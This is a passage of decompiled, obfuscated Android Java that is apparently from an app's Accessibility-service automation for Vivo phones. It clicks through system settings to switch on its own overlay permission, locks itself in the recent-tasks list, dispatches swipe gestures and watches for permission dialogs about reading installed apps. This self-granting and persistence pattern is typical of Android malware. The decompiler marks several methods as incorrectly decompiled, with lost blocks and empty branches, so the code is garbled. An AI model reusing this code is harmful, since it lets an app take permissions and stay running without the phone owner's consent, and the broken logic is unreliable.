                                                str7 = str5;
                                                vivoSteps$executeOverlayPermissionInternal$1 = vivoSteps$executeOverlayPermissionInternal$13;
                                                if (((Boolean) objM212431f9).booleanValue()) {
                                                    t60.m214704c5(c0371a83.f55141a2, "[悬浮窗权限] ❌ 搜索应用失败");
                                                    return Boolean.FALSE;
                                                }
                                                vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a83;
                                                vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str7;
                                                vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 9;
                                                if (b81.m210571b1(200L, vivoSteps$executeOverlayPermissionInternal$1) != coroutineSingletons) {
                                                    String str11 = str7;
                                                    c0371a84 = c0371a83;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a84;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = null;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 10;
                                                    objM212431f9 = c0371a84.m212386a3(str11, vivoSteps$executeOverlayPermissionInternal$1);
                                                    if (objM212431f9 != coroutineSingletons) {
                                                        if (((Boolean) objM212431f9).booleanValue()) {
                                                            t60.m214704c5(c0371a84.f55141a2, "[悬浮窗权限] ❌ 点击开关失败");
                                                            return Boolean.FALSE;
                                                        }
                                                        c0371a84.f55142a3.m214998b3("vivo_overlay_switch_done");
                                                        vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a84;
                                                        vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 11;
                                                        if (b81.m210571b1(200L, vivoSteps$executeOverlayPermissionInternal$1) != coroutineSingletons) {
                                                            context = c0371a84.f55140a1;
                                                            if (!Settings.canDrawOverlays(context)) {
                                                                c0371a84.f55142a3.m214997b2(vivoSteps$FlowType);
                                                                try {
                                                                    Intent intent2 = new Intent(context, (Class<?>) iuzxujjtqev.class);
                                                                    intent2.setFlags(268468224);
                                                                    context.startActivity(intent2);
                                                                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a84;
                                                                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 12;
                                                                    break;
                                                                } catch (Exception e2) {
                                                                    e = e2;
                                                                    tz0.m214810b0("[悬浮窗权限] ⚠️ 清除栈失败: ", e.getMessage(), c0371a84.f55141a2);
                                                                    c0371a84.f55139a0.performGlobalAction(i5);
                                                                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = null;
                                                                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 13;
                                                                    break;
                                                                }
                                                            } else {
                                                                t60.m214726f4(c0371a84.f55141a2, "[悬浮窗权限] ⚠️ 操作完成但权限未开启");
                                                                return Boolean.FALSE;
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        } else if (zBooleanValue) {
                        }
                    }
                    return coroutineSingletons;
                }
                str2 = str;
                c0371a8 = this;
                vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$1;
                i = 0;
                i2 = 0;
                str5 = str2;
                if (i >= i8) {
                }
                break;
            case 1:
                String str12 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a8 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                objM212430f8 = objM212431f9;
                str2 = str12;
                zBooleanValue = ((Boolean) objM212430f8).booleanValue();
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 2:
                str3 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a8 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                String str82 = str3;
                zBooleanValue = ((Boolean) objM212431f9).booleanValue();
                str2 = str82;
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 3:
                str4 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a8 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                String str92 = str4;
                zBooleanValue = ((Boolean) objM212431f9).booleanValue();
                str2 = str92;
                if (zBooleanValue) {
                }
                vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$1;
                i = 0;
                i2 = 0;
                str5 = str2;
                if (i >= i8) {
                }
                break;
            case 4:
                String str13 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a8 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                str2 = str13;
                if (Settings.canDrawOverlays(c0371a8.f55140a1)) {
                    c0371a8.f55142a3.m214997b2(vivoSteps$FlowType);
                    return Boolean.TRUE;
                }
                vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$1;
                i = 0;
                i2 = 0;
                str5 = str2;
                if (i >= i8) {
                }
                break;
            case 5:
                i3 = vivoSteps$executeOverlayPermissionInternal$1.f54911a3;
                i4 = vivoSteps$executeOverlayPermissionInternal$1.f54910a2;
                str6 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a82 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                if (!((Boolean) objM212431f9).booleanValue()) {
                }
                return coroutineSingletons;
            case 6:
                i3 = vivoSteps$executeOverlayPermissionInternal$1.f54911a3;
                i4 = vivoSteps$executeOverlayPermissionInternal$1.f54910a2;
                str6 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a82 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                if (c0371a82.m212434g2("悬浮窗页面", AbstractC0716jf.m213306g5("settings", "permissionmanager", "vivo"))) {
                    vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$1;
                    str5 = str6;
                    c0371a83 = c0371a82;
                    i2 = i5;
                    if (i2 != 0) {
                    }
                }
                vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a82;
                vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str6;
                vivoSteps$executeOverlayPermissionInternal$1.f54910a2 = i4;
                vivoSteps$executeOverlayPermissionInternal$1.f54911a3 = i3;
                vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 7;
                break;
            case 7:
                i3 = vivoSteps$executeOverlayPermissionInternal$1.f54911a3;
                i4 = vivoSteps$executeOverlayPermissionInternal$1.f54910a2;
                str6 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a82 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                C0371a8 c0371a85 = c0371a82;
                i2 = i4;
                c0371a8 = c0371a85;
                VivoSteps$executeOverlayPermissionInternal$1 vivoSteps$executeOverlayPermissionInternal$14 = vivoSteps$executeOverlayPermissionInternal$1;
                str5 = str6;
                i = i3 + 1;
                vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$14;
                i9 = i5;
                i8 = 3;
                if (i >= i8) {
                }
                break;
            case 8:
                str7 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a83 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                if (((Boolean) objM212431f9).booleanValue()) {
                }
                break;
            case 9:
                str7 = vivoSteps$executeOverlayPermissionInternal$1.f54909a1;
                c0371a83 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                String str112 = str7;
                c0371a84 = c0371a83;
                vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a84;
                vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = null;
                vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 10;
                objM212431f9 = c0371a84.m212386a3(str112, vivoSteps$executeOverlayPermissionInternal$1);
                if (objM212431f9 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                c0371a84 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                if (((Boolean) objM212431f9).booleanValue()) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                c0371a84 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                kg1.m213544f4(objM212431f9);
                i5 = 1;
                context = c0371a84.f55140a1;
                if (!Settings.canDrawOverlays(context)) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0371a84 = vivoSteps$executeOverlayPermissionInternal$1.f54908a0;
                try {
                    kg1.m213544f4(objM212431f9);
                } catch (Exception e3) {
                    e = e3;
                    i5 = 1;
                    tz0.m214810b0("[悬浮窗权限] ⚠️ 清除栈失败: ", e.getMessage(), c0371a84.f55141a2);
                    c0371a84.f55139a0.performGlobalAction(i5);
                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = null;
                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 13;
                    break;
                }
                return Boolean.TRUE;
            case 13:
                kg1.m213544f4(objM212431f9);
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212408c6(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executePermissionManagerInternal$1 vivoSteps$executePermissionManagerInternal$1;
        C0371a8 c0371a8;
        if (continuationImpl instanceof VivoSteps$executePermissionManagerInternal$1) {
            vivoSteps$executePermissionManagerInternal$1 = (VivoSteps$executePermissionManagerInternal$1) continuationImpl;
            int i = vivoSteps$executePermissionManagerInternal$1.f54918a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$executePermissionManagerInternal$1.f54918a3 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$executePermissionManagerInternal$1 = new VivoSteps$executePermissionManagerInternal$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$executePermissionManagerInternal$1.f54916a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$executePermissionManagerInternal$1.f54918a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(this.f55143a4, this.f55144a5));
            Context context = this.f55140a1;
            intent.putExtra("packagename", context.getPackageName());
            intent.setFlags(276824064);
            try {
                context.startActivity(intent);
                vivoSteps$executePermissionManagerInternal$1.f54915a0 = this;
                vivoSteps$executePermissionManagerInternal$1.f54918a3 = 1;
                if (b81.m210571b1(500L, vivoSteps$executePermissionManagerInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0371a8 = this;
            } catch (Exception e) {
                tz0.m214807a7("[权限管理] ❌ 打开失败: ", e.getMessage(), this.f55141a2);
                return Boolean.FALSE;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0371a8 = vivoSteps$executePermissionManagerInternal$1.f54915a0;
            kg1.m213544f4(obj);
        }
        if (!c0371a8.m212434g2("权限管理页面", AbstractC1117qo.m214451e7(c0371a8.f55143a4))) {
            return Boolean.FALSE;
        }
        c0371a8.f55142a3.m214997b2(VivoSteps$FlowType.PERMISSION_MANAGER);
        return Boolean.TRUE;
    }

    /* JADX WARN: Code restructure failed: missing block: B:35:0x00b3, code lost:
    
        if (p000.b81.m210571b1(300, r15) != r1) goto L37;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x00dc, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L45;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00f5, code lost:
    
        if (p000.b81.m210571b1(300, r0) == r1) goto L45;
     */
    /* JADX WARN: Removed duplicated region for block: B:24:0x0068  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x008b  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x00c0  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x00fd  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:41:0x00dc -> B:46:0x00f8). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:44:0x00f5 -> B:46:0x00f8). Please report as a decompilation issue!!! */
    /* renamed from: c7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212409c7(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeVivoRecentTaskLock$1 vivoSteps$executeVivoRecentTaskLock$1;
        C0371a8 c0371a8;
        int i;
        C0371a8 c0371a82;
        VivoSteps$executeVivoRecentTaskLock$1 vivoSteps$executeVivoRecentTaskLock$12;
        C0371a8 c0371a83;
        int i2;
        if (continuationImpl instanceof VivoSteps$executeVivoRecentTaskLock$1) {
            vivoSteps$executeVivoRecentTaskLock$1 = (VivoSteps$executeVivoRecentTaskLock$1) continuationImpl;
            int i3 = vivoSteps$executeVivoRecentTaskLock$1.f54923a4;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeVivoRecentTaskLock$1.f54923a4 = i3 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeVivoRecentTaskLock$1 = new VivoSteps$executeVivoRecentTaskLock$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$executeVivoRecentTaskLock$1.f54921a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = vivoSteps$executeVivoRecentTaskLock$1.f54923a4;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            t60.m214704c5(this.f55141a2, "[清除任务] ★★★ 开始执行VIVO最近任务（华为方式-下滑锁定V2）★★★");
            c0371a8 = this;
            i = 1;
            if (i < 4) {
            }
        } else {
            if (i4 == 1) {
                i2 = vivoSteps$executeVivoRecentTaskLock$1.f54920a1;
                c0371a83 = vivoSteps$executeVivoRecentTaskLock$1.f54919a0;
                kg1.m213544f4(obj);
                if (((Boolean) obj).booleanValue()) {
                }
                return coroutineSingletons;
            }
            if (i4 == 2) {
                C0371a8 c0371a84 = vivoSteps$executeVivoRecentTaskLock$1.f54919a0;
                kg1.m213544f4(obj);
                vivoSteps$executeVivoRecentTaskLock$12 = vivoSteps$executeVivoRecentTaskLock$1;
                c0371a82 = c0371a84;
                t60.m214704c5(c0371a82.f55141a2, "[锁定任务] 返回桌面");
                c0371a82.f55139a0.performGlobalAction(2);
                vivoSteps$executeVivoRecentTaskLock$12.f54919a0 = c0371a82;
                vivoSteps$executeVivoRecentTaskLock$12.f54923a4 = 3;
            } else {
                if (i4 == 3) {
                    c0371a82 = vivoSteps$executeVivoRecentTaskLock$1.f54919a0;
                    kg1.m213544f4(obj);
                    t60.m214704c5(c0371a82.f55141a2, "[锁定任务] ✅ 完成");
                    return Boolean.TRUE;
                }
                if (i4 != 4 && i4 != 5) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i2 = vivoSteps$executeVivoRecentTaskLock$1.f54920a1;
                c0371a83 = vivoSteps$executeVivoRecentTaskLock$1.f54919a0;
                kg1.m213544f4(obj);
                i = i2 + 1;
                c0371a8 = c0371a83;
                if (i < 4) {
                    tz0.m214806a6("[清除任务] ========== 第", i, "次尝试 ==========", c0371a8.f55141a2);
                    vivoSteps$executeVivoRecentTaskLock$1.f54919a0 = c0371a8;
                    vivoSteps$executeVivoRecentTaskLock$1.f54920a1 = i;
                    vivoSteps$executeVivoRecentTaskLock$1.f54923a4 = 1;
                    Object objM212433g1 = c0371a8.m212433g1(vivoSteps$executeVivoRecentTaskLock$1);
                    if (objM212433g1 != coroutineSingletons) {
                        C0371a8 c0371a85 = c0371a8;
                        i2 = i;
                        obj = objM212433g1;
                        c0371a83 = c0371a85;
                        if (((Boolean) obj).booleanValue()) {
                            t60.m214704c5(c0371a83.f55141a2, "[锁定任务] ✅ 锁定成功");
                            vivoSteps$executeVivoRecentTaskLock$1.f54919a0 = c0371a83;
                            vivoSteps$executeVivoRecentTaskLock$1.f54923a4 = 2;
                            if (b81.m210571b1(300L, vivoSteps$executeVivoRecentTaskLock$1) != coroutineSingletons) {
                                vivoSteps$executeVivoRecentTaskLock$12 = vivoSteps$executeVivoRecentTaskLock$1;
                                c0371a82 = c0371a83;
                                t60.m214704c5(c0371a82.f55141a2, "[锁定任务] 返回桌面");
                                c0371a82.f55139a0.performGlobalAction(2);
                                vivoSteps$executeVivoRecentTaskLock$12.f54919a0 = c0371a82;
                                vivoSteps$executeVivoRecentTaskLock$12.f54923a4 = 3;
                            }
                        } else {
                            if (i2 < 3) {
                                tz0.m214806a6("[清除任务] ❌ 第", i2, "次锁定失败，返回桌面后重试...", c0371a83.f55141a2);
                                c0371a83.f55139a0.performGlobalAction(2);
                                vivoSteps$executeVivoRecentTaskLock$1.f54919a0 = c0371a83;
                                vivoSteps$executeVivoRecentTaskLock$1.f54920a1 = i2;
                                vivoSteps$executeVivoRecentTaskLock$1.f54923a4 = 4;
                            } else {
                                t60.m214704c5(c0371a83.f55141a2, "[清除任务] ❌ 3次尝试都失败，放弃锁定，直接完成");
                                c0371a83.f55139a0.performGlobalAction(2);
                                vivoSteps$executeVivoRecentTaskLock$1.f54919a0 = c0371a83;
                                vivoSteps$executeVivoRecentTaskLock$1.f54920a1 = i2;
                                vivoSteps$executeVivoRecentTaskLock$1.f54923a4 = 5;
                            }
                            if (i < 4) {
                                t60.m214704c5(c0371a8.f55141a2, "[清除任务] ✅ 完成（锁定失败但流程结束）");
                                return Boolean.FALSE;
                            }
                        }
                    }
                    return coroutineSingletons;
                }
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:25:0x0067, code lost:
    
        if (p000.b81.m210571b1(100, r0) == r1) goto L35;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x0089, code lost:
    
        if (p000.b81.m210571b1(100, r0) == r1) goto L35;
     */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0042  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x008e  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:20:0x0048 -> B:36:0x008c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:34:0x0089 -> B:36:0x008c). Please report as a decompilation issue!!! */
    /* renamed from: c8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212410c8(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$findAndClickAnySwitch$1 vivoSteps$findAndClickAnySwitch$1;
        C0371a8 c0371a8;
        int i;
        if (continuationImpl instanceof VivoSteps$findAndClickAnySwitch$1) {
            vivoSteps$findAndClickAnySwitch$1 = (VivoSteps$findAndClickAnySwitch$1) continuationImpl;
            int i2 = vivoSteps$findAndClickAnySwitch$1.f54928a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                vivoSteps$findAndClickAnySwitch$1.f54928a4 = i2 - Integer.MIN_VALUE;
            } else {
                vivoSteps$findAndClickAnySwitch$1 = new VivoSteps$findAndClickAnySwitch$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$findAndClickAnySwitch$1.f54926a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = vivoSteps$findAndClickAnySwitch$1.f54928a4;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            c0371a8 = this;
            i = 1;
            if (i >= 4) {
            }
        } else {
            if (i3 == 1) {
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            }
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = vivoSteps$findAndClickAnySwitch$1.f54925a1;
            c0371a8 = vivoSteps$findAndClickAnySwitch$1.f54924a0;
            kg1.m213544f4(obj);
            i++;
            if (i >= 4) {
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0371a8.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212376d1 = m212376d1(rootInActiveWindow);
                if (accessibilityNodeInfoM212376d1 == null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM212375d0 = m212375d0(rootInActiveWindow);
                    if (accessibilityNodeInfoM212375d0 != null) {
                        accessibilityNodeInfoM212375d0.recycle();
                        rootInActiveWindow.recycle();
                        return Boolean.TRUE;
                    }
                    rootInActiveWindow.recycle();
                    vivoSteps$findAndClickAnySwitch$1.f54924a0 = c0371a8;
                    vivoSteps$findAndClickAnySwitch$1.f54925a1 = i;
                    vivoSteps$findAndClickAnySwitch$1.f54928a4 = 2;
                } else {
                    accessibilityNodeInfoM212376d1.performAction(16);
                    accessibilityNodeInfoM212376d1.recycle();
                    rootInActiveWindow.recycle();
                    vivoSteps$findAndClickAnySwitch$1.f54924a0 = null;
                    vivoSteps$findAndClickAnySwitch$1.f54928a4 = 1;
                }
                return coroutineSingletons;
            }
            i++;
            if (i >= 4) {
            }
        }
    }

    /* renamed from: c9 */
    public final Rect m212411c9(String str) {
        AccessibilityNodeInfo next;
        Context context = this.f55140a1;
        String str2 = this.f55141a2;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        try {
            if (rootInActiveWindow == null) {
                return null;
            }
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText == null) {
                    listFindAccessibilityNodeInfosByText = EmptyList.f57568a0;
                }
                Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
                do {
                    if (!it.hasNext()) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(context.getPackageName());
                        if (listFindAccessibilityNodeInfosByText2 == null) {
                            listFindAccessibilityNodeInfosByText2 = EmptyList.f57568a0;
                        }
                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText2) {
                            if (accessibilityNodeInfo.isVisibleToUser()) {
                                Rect rect = new Rect();
                                accessibilityNodeInfo.getBoundsInScreen(rect);
                                t60.m214704c5(str2, "[查找APP卡片] ✅ 通过包名找到APP: " + context.getPackageName() + ", 位置: " + rect);
                                rootInActiveWindow.recycle();
                                return rect;
                            }
                        }
                        String string = context.getString(R$string.app_name);
                        t60.m214694b5(string, "context.getString(R.string.app_name)");
                        String str3 = (String) AbstractC0715je.m213297i4(AbstractC0779a1.m213677d0(str, new String[]{"."}, 6));
                        if (str3 == null) {
                            str3 = "";
                        }
                        for (String str4 : AbstractC0716jf.m213306g5(string, str, "Player", str3)) {
                            if (!AbstractC0779a1.m213663b6(str4)) {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText(str4);
                                if (listFindAccessibilityNodeInfosByText3 == null) {
                                    listFindAccessibilityNodeInfosByText3 = EmptyList.f57568a0;
                                }
                                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText3) {
                                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                                        Rect rect2 = new Rect();
                                        accessibilityNodeInfo2.getBoundsInScreen(rect2);
                                        t60.m214704c5(str2, "[查找APP卡片] ✅ 通过名称变体找到APP: " + str4 + ", 位置: " + rect2);
                                        rootInActiveWindow.recycle();
                                        return rect2;
                                    }
                                }
                            }
                        }
                        t60.m214704c5(str2, "[查找APP卡片] ❌ 未找到APP卡片");
                        rootInActiveWindow.recycle();
                        return null;
                    }
                    next = it.next();
                } while (!next.isVisibleToUser());
                Rect rect3 = new Rect();
                next.getBoundsInScreen(rect3);
                t60.m214704c5(str2, "[查找APP卡片] ✅ 通过名称找到APP: " + str + ", 位置: " + rect3);
                rootInActiveWindow.recycle();
                return rect3;
            } catch (Exception e) {
                t60.m214704c5(str2, "[查找APP卡片] 异常: " + e.getMessage());
                rootInActiveWindow.recycle();
                return null;
            }
        } catch (Throwable th) {
            rootInActiveWindow.recycle();
            throw th;
        }
    }

    /* renamed from: d9 */
    public final AccessibilityNodeInfo m212412d9(String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        if (rootInActiveWindow == null || (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str)) == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            return null;
        }
        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
            CharSequence text = accessibilityNodeInfo.getText();
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            boolean zIsVisibleToUser = accessibilityNodeInfo.isVisibleToUser();
            accessibilityNodeInfo.getBoundsInScreen(new Rect());
            if (text != null && t60.m214686a2(text.toString(), str) && !AbstractC0779a1.m213655a8(string, false, ".AutoCompleteTextView")) {
                if (zIsVisibleToUser) {
                    return accessibilityNodeInfo;
                }
                return null;
            }
        }
        return null;
    }

    /* renamed from: e0 */
    public final void m212413e0() {
        float f = this.f55140a1.getResources().getDisplayMetrics().widthPixels * 0.1f;
        Path path = new Path();
        path.moveTo(f, m212414e1() * 0.85f);
        path.lineTo(f, m212414e1() * 0.25f);
        this.f55139a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 300L)).build(), null, null);
    }

    /* renamed from: e1 */
    public final int m212414e1() {
        return this.f55140a1.getResources().getDisplayMetrics().heightPixels;
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x003c  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x0055  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:20:0x004f -> B:21:0x0052). Please report as a decompilation issue!!! */
    /* renamed from: e3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212415e3(long j, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$interruptibleDelay$1 vivoSteps$interruptibleDelay$1;
        if (continuationImpl instanceof VivoSteps$interruptibleDelay$1) {
            vivoSteps$interruptibleDelay$1 = (VivoSteps$interruptibleDelay$1) continuationImpl;
            int i = vivoSteps$interruptibleDelay$1.f54933a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$interruptibleDelay$1.f54933a4 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$interruptibleDelay$1 = new VivoSteps$interruptibleDelay$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$interruptibleDelay$1.f54931a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$interruptibleDelay$1.f54933a4;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            if (j > 0) {
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j2 = vivoSteps$interruptibleDelay$1.f54930a1;
            long j3 = vivoSteps$interruptibleDelay$1.f54929a0;
            kg1.m213544f4(obj);
            j = j3 - j2;
            if (j > 0) {
                long jMin = Math.min(j, 100L);
                vivoSteps$interruptibleDelay$1.f54929a0 = j;
                vivoSteps$interruptibleDelay$1.f54930a1 = jMin;
                vivoSteps$interruptibleDelay$1.f54933a4 = 1;
                if (b81.m210571b1(jMin, vivoSteps$interruptibleDelay$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                j3 = j;
                j2 = jMin;
                j = j3 - j2;
                if (j > 0) {
                    return C1351vv.f60710b1;
                }
            }
        }
    }

    /* renamed from: e4 */
    public final boolean m212416e4() {
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        try {
            try {
                for (String str : AbstractC0716jf.m213306g5("读取已安装应用", "请求读取已安装应用", "应用列表", "已安装应用列表")) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                        while (it.hasNext()) {
                            if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                t60.m214702c3(this.f55141a2, "[基础权限] 检测到应用列表权限弹窗: " + str);
                                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it2.hasNext()) {
                                    try {
                                        ((AccessibilityNodeInfo) it2.next()).recycle();
                                    } catch (Exception unused) {
                                    }
                                }
                                try {
                                    return true;
                                } catch (Exception unused2) {
                                    return true;
                                }
                            }
                        }
                    }
                    if (listFindAccessibilityNodeInfosByText != null) {
                        Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                        while (it3.hasNext()) {
                            try {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            } catch (Exception unused3) {
                            }
                        }
                    }
                }
            } finally {
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused4) {
                }
            }
        } catch (Exception unused5) {
        }
        try {
            rootInActiveWindow.recycle();
            return false;
        } catch (Exception unused6) {
            return false;
        }
    }

    /* renamed from: e5 */
    public final boolean m212417e5() {
